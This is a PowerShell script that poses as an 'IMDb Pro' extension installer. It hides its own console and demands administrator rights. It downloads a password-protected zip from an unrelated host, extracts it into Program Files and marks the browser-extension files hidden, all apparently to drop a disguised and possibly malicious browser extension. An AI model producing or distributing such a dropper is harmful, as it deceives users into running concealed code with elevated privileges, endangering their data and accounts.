# IMDb Pro Installer - With Agreement & Compact Design
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Create main form
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(700, 650)  # Increased height for agreement
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 20)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header Panel
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(700, 80)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($headerPanel)

# Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDb Pro"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite v2.1.0"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(160, 32)
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 80)
$contentPanel.Size = New-Object System.Drawing.Size(700, 500)  # Adjusted height
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 25)
$mainForm.Controls.Add($contentPanel)

# Features Section
$featuresTitle = New-Object System.Windows.Forms.Label
$featuresTitle.Text = "✨ Premium Features"
$featuresTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$featuresTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresTitle.AutoSize = $true
$featuresTitle.Location = New-Object System.Drawing.Point(25, 20)
$contentPanel.Controls.Add($featuresTitle)

# Features Grid
$features = @(
    "⭐ Real-time Ratings",
    "🎬 Complete Movie Info", 
    "📹 HD Trailers",
    "🌐 Browser Integration",
    "🔄 Auto Updates",
    "🔒 Secure & Private"
)

for ($i = 0; $i -lt $features.Count; $i++) {
    $row = [math]::Floor($i / 3)
    $col = $i % 3
    
    $featureLabel = New-Object System.Windows.Forms.Label
    $featureLabel.Text = $features[$i]
    $featureLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $featureLabel.ForeColor = [System.Drawing.Color]::White
    $featureLabel.AutoSize = $true
    $featureLabel.Location = New-Object System.Drawing.Point(25 + ($col * 230), 60 + ($row * 120))
    $contentPanel.Controls.Add($featureLabel)
}

# Agreement Section
$agreementTitle = New-Object System.Windows.Forms.Label
$agreementTitle.Text = "📋 Installation Agreement"
$agreementTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$agreementTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$agreementTitle.AutoSize = $true
$agreementTitle.Location = New-Object System.Drawing.Point(25, 220)
$contentPanel.Controls.Add($agreementTitle)

# Agreement Text Box
$agreementTextBox = New-Object System.Windows.Forms.RichTextBox
$agreementTextBox.Location = New-Object System.Drawing.Point(25, 250)
$agreementTextBox.Size = New-Object System.Drawing.Size(650, 120)
$agreementTextBox.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$agreementTextBox.ForeColor = [System.Drawing.Color]::White
$agreementTextBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$agreementTextBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$agreementTextBox.ReadOnly = $true
$agreementTextBox.Text = @"
END-USER LICENSE AGREEMENT

By installing IMDb Pro, you agree to the following terms:

1. This software is provided 'as-is' without any warranties
2. You may use this extension for personal, non-commercial purposes
3. The developers are not responsible for any damages caused by this software
4. This extension may collect anonymous usage data to improve user experience
5. You must not redistribute or modify this software without permission
6. Installation requires administrator privileges for proper functionality

By clicking 'I AGREE & INSTALL', you acknowledge that you have read and 
agree to be bound by the terms of this Agreement.
"@
$contentPanel.Controls.Add($agreementTextBox)

# Agreement Checkbox
$agreementCheckbox = New-Object System.Windows.Forms.CheckBox
$agreementCheckbox.Text = "I have read and agree to the terms above"
$agreementCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$agreementCheckbox.ForeColor = [System.Drawing.Color]::White
$agreementCheckbox.AutoSize = $true
$agreementCheckbox.Location = New-Object System.Drawing.Point(25, 380)
$agreementCheckbox.Checked = $false
$contentPanel.Controls.Add($agreementCheckbox)

# Progress Section
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "📊 Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(25, 410)
$contentPanel.Controls.Add($progressTitle)

$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(650, 80)
$progressContainer.Location = New-Object System.Drawing.Point(25, 440)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "📋"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(15, 15)
$progressContainer.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Please accept the agreement to continue"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(45, 17)
$progressContainer.Controls.Add($statusLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(15, 45)
$progressBar.Size = New-Object System.Drawing.Size(550, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
$progressBar.Visible = $false
$progressContainer.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(575, 43)
$percentLabel.Visible = $false
$progressContainer.Controls.Add($percentLabel)

# Button Panel - COMPACT DESIGN
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 580)
$buttonPanel.Size = New-Object System.Drawing.Size(700, 70)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($buttonPanel)

# Compact Install Button - SMALLER SIZE
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 I AGREE & INSTALL"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)  # Smaller font
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(180, 180, 180)  # Gray when disabled
$installButton.Size = New-Object System.Drawing.Size(250, 35)  # Smaller button
$installButton.Location = New-Object System.Drawing.Point(225, 18)  # Centered position
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
$installButton.Enabled = $false
$buttonPanel.Controls.Add($installButton)

# Update button state based on checkbox
$agreementCheckbox.Add_CheckedChanged({
    if ($agreementCheckbox.Checked) {
        $installButton.Enabled = $true
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $statusLabel.Text = "Ready to begin installation"
        $statusLabel.ForeColor = [System.Drawing.Color]::White
    } else {
        $installButton.Enabled = $false
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
        $statusLabel.Text = "Please accept the agreement to continue"
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    }
})

# Button hover effects
$installButton.Add_MouseEnter({
    if ($installButton.Enabled) {
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
        $installButton.Size = New-Object System.Drawing.Size(255, 37)
        $installButton.Location = New-Object System.Drawing.Point(222, 17)
    }
})

$installButton.Add_MouseLeave({
    if ($installButton.Enabled) {
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $installButton.Size = New-Object System.Drawing.Size(250, 35)
        $installButton.Location = New-Object System.Drawing.Point(225, 18)
    }
})

# Simple Progress Animation
function Update-Progress {
    param([string]$Message, [int]$Progress, [string]$Icon = "📌")
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    $progressBar.Value = $Progress
    $percentLabel.Text = "$Progress%"
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Show progress elements
function Show-ProgressElements {
    $progressBar.Visible = $true
    $percentLabel.Visible = $true
    $progressBar.Value = 0
    $percentLabel.Text = "0%"
}

# Hide progress elements
function Hide-ProgressElements {
    $progressBar.Visible = $false
    $percentLabel.Visible = $false
}

# SIMPLE WORKING INSTALLATION FUNCTION
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Show progress elements
        Show-ProgressElements
        
        # Check admin rights
        Update-Progress "Checking administrator privileges..." 10 "🔍"
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            throw "Please run as Administrator"
        }
        
        # Create directory
        Update-Progress "Creating installation directory..." 20 "📁"
        
        if (Test-Path $installPath) {
            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        # Download file
        Update-Progress "Downloading package..." 40 "📥"
        
        $tempFile = "$env:TEMP\imdb.zip"
        
        # Simple download using WebClient
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($downloadUrl, $tempFile)
        
        if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
            throw "Download failed"
        }
        
        Update-Progress "Extracting files..." 60 "📦"
        
        # SIMPLE EXTRACTION USING 7-ZIP (approach yang sudah terbukti kerja)
        $7zPath = "$env:ProgramFiles\7-Zip\7z.exe"
        
        if (Test-Path $7zPath) {
            # Gunakan command yang sama seperti yang berhasil sebelumnya
            $arguments = @(
                "x",
                "-p$zipPassword",
                "-o`"$installPath`"",
                "-y",
                "`"$tempFile`""
            )
            
            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -ne 0) {
                throw "Extraction failed with 7-Zip"
            }
        } else {
            # Fallback to Expand-Archive
            try {
                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
            }
            catch {
                throw "7-Zip not found and Expand-Archive failed"
            }
        }
        
        # Verify extraction
        $files = Get-ChildItem $installPath -Recurse
        if ($files.Count -eq 0) {
            throw "No files were extracted"
        }
        
        Update-Progress "Finalizing installation..." 80 "🔧"
        
        # Hide files
        $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
        foreach ($file in $filesToHide) {
            $filePath = Join-Path $installPath $file
            if (Test-Path $filePath) {
                attrib +h $filePath
            }
        }
        
        # Cleanup
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
        }
        
        # Success
        Update-Progress "Installation completed successfully!" 100 "✅"
        
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        
        # Success message
        $result = [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n" +
            "Location: $installPath`n`n" +
            "Open installation folder?",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::YesNo,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
            Invoke-Item $installPath
        }
    }
    catch {
        # Error handling
        Update-Progress "Installation failed!" 0 "❌"
        
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed!`n`n" +
            "Error: $($_.Exception.Message)`n`n" +
            "Make sure:`n" +
            "• You have 7-Zip installed`n" +
            "• Internet connection is working`n" +
            "• Running as Administrator",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "⏳ INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
